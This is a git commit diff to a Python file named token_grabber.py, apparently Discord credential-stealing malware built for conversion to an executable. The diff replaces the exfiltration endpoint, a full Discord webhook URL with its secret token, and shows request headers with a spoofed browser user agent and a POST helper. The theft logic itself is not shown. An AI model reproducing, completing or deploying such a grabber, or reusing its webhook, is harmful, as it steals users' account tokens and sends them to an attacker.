3b794b1db0854d090f445aff157b69f1bdf77027
eroge-69 <erogexunamed@gmail.com>
2025-08-21 22:21:53 +0700

    Upload token_grabber.py via PY to EXE tool

--- python-files/token_grabber.py
+++ python-files/token_grabber.py
@@ -11,7 +11,7 @@ REQUEST_HEADERS = {
     "Content-Type": "application/json",
     "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
 }
-WEBHOOK_URL = "https://discord.com/api/webhooks/1407003256781144154/DbY3bq8X7lfQfltMiOoAg3yWcy0CnoutTZWciesf962uFHCrlHBG5-nyBEH0adxPUhG9"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1408104261665165403/XuEZgGcVpSXCBh5PzD5-t0wIqliqCRweBUkpqDjyHAWiMsIIBiquEMN7t8M5poPOKvKX"
 
 
 def make_post_request(api_url: str, data: dict[str, str]) -> int:
